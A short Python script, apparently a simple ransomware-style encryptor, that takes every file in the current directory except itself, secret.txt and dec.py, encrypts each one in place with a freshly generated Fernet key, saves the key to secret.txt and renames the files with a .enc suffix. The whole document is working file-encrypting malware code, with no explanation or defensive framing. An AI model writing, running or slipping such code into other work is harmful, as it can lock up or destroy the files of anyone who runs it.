#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

sage = []

for file in os.listdir():
   if file == "enc.py" or file == "secret.txt" or file == "dec.py":
       	continue

   if  os.path.isfile(file):
   	sage.append(file)


key = Fernet.generate_key()


with open("secret.txt", "wb") as srt:
     srt.write(key)

for file in sage:
    with open(file, "rb")as f:
        contents = f.read()

    contents_adv = Fernet(key).encrypt(contents)

    with open(file, "wb")as f:
        f.write(contents_adv)


    new_f = file + ".enc"
    os.rename(file, new_f)


